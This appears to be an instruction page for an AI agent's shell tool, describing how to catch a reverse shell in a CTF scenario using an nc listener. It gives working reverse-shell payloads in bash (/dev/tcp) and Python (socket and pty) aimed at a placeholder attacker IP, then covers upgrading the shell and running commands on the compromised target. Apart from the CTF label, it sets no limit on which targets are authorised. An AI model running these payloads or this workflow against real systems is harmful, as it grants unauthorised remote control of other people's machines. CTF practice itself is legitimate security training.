# CTF Reverse Shell Scenario

## Typical Workflow: nc listener + target reverse connection

1. Start an interactive listening session locally:
   shell_spawn(shell="bash", tag="listener")
   shell_send_line(input="nc -lvnp 4444", tag="listener")
2. Confirm the listener has started:
   shell_output(tag="listener", idle_ms=500) -> should see "listening on [any] 4444"
3. Trigger the reverse command on the target machine (usually via an acquired web shell / command execution vulnerability), e.g., common payloads (adjust IP/port/interpreter based on actual task):
    - bash: `bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1`
    - python: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<attacker_ip>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`
      This step is usually NOT executed directly via shell_send_line of this tool (the payload runs on the target). Instead, deliver the payload to the channel that triggers the vulnerability; the listener session of this tool only "receives" the reverse connection.
4. After the reverse connection is established, the listener session itself becomes the target machine's shell:
   shell_output(tag="listener", idle_ms=2000) -> observe if the target machine prompt appears
   (e.g., `www-data@target:/$`), confirming shell access. Or use
   shell_wait_for(tag="listener", pattern="$", timeout_ms=5000) if you expect a specific prompt shape.
5. Stabilize the shell (optional, depends on target environment support):
   shell_send_line(input="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", tag="listener")
   shell_send_line(input="export TERM=xterm", tag="listener")
6. Every subsequent command executed inside the target machine is sent via shell_send_line(tag="listener"). You must use shell_output to confirm the result before deciding the next step, identical to the "all commands execute remotely after login" rule in the SSH scenario.
7. Upon task completion (flag acquired / goal achieved):
   shell_close(tag="listener")

## Key Points

- The listener phase uses local nc. `nc` is NOT an "invalid shell value" here—it is run as a command within the bash session, not passed directly to shell_spawn as the shell parameter.
- The execution environment obtained after the reverse shell connects belongs to the target. These operations act on remote targets and usually do not affect the user's local machine; however, if it involves writing remote data back to the local disk, or the remote host initiating actions on the local machine, you must follow guide://shell/security Rule 2: explain first, then execute.